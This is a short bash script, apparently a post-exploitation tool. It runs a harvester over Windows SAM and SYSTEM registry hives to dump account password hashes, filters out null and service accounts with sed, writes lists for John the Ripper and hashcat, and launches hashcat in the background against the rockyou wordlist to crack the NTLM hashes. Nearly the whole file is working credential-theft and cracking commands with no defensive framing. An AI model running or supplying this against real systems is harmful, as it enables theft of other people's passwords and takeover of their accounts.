#!/bin/bash
# harvest all SAM & SYSTEM hives scrape out all worthless accounts using sed
# pipe to tee so john the ripper can use for cracking
# pipe that to cut grab just the NTLM hashes from the list and tee those out to hashcat for cracking
# aad3b435b51404eeaad3b435b51404ee is a NULL PASSWORD HASH so we just ignore these since it will tie up unessisary resources
# 31d6cfe0d16ae931b73c59d7e0c089c0 is a usseless hash we need to remove that after we send the data to cut
# QBDataServiceUser* is a non privliaged Quick Books User for the database service
# (password is probably really hard to crack and its a non privleaged user)
# UpdatusUser is nvidia update user also uneeded
./harvest.py | sed "s:.*aad3b435b51404eeaad3b435b51404ee.*::g" | sed "s:UpdatusUser.*::g" | sed "s:ASPNET.*::g" | sed "s:QBDataServiceUser.*::g" | sed "s:SUPPORT.*::g" | sed "s:HelpAssistant.*::g" | sed "s:HomeGroupUser.*::g" | sed "s:ERR\: .*::g" | sed "s:Couldn't find.*::g" | sed "s:[Gg]uest.*::g" | sort -u | tee john.lst | cut -f 1,4 -d ":" | sed "s:.*\:31d6cfe0d16ae931b73c59d7e0c089c0::g" | tee hashcat.lst
echo " "
echo " "
echo "Passwords have been dumped to hashcat.lst and john.lst for cracking"
echo "Hashcat is now forked see hashcat.log"
hashcat --username --status -m 1000 -a 0 -o cracked.txt --remove /media/hashcat.lst /usr/share/wordlists/rockyou.txt >hashcat.log 2>&1 &
echo " "
echo " "
echo "Running Driver Extraction procedures......"
#./driver_extractor.py | tee | xargs -i cp -R {} /media/drivers
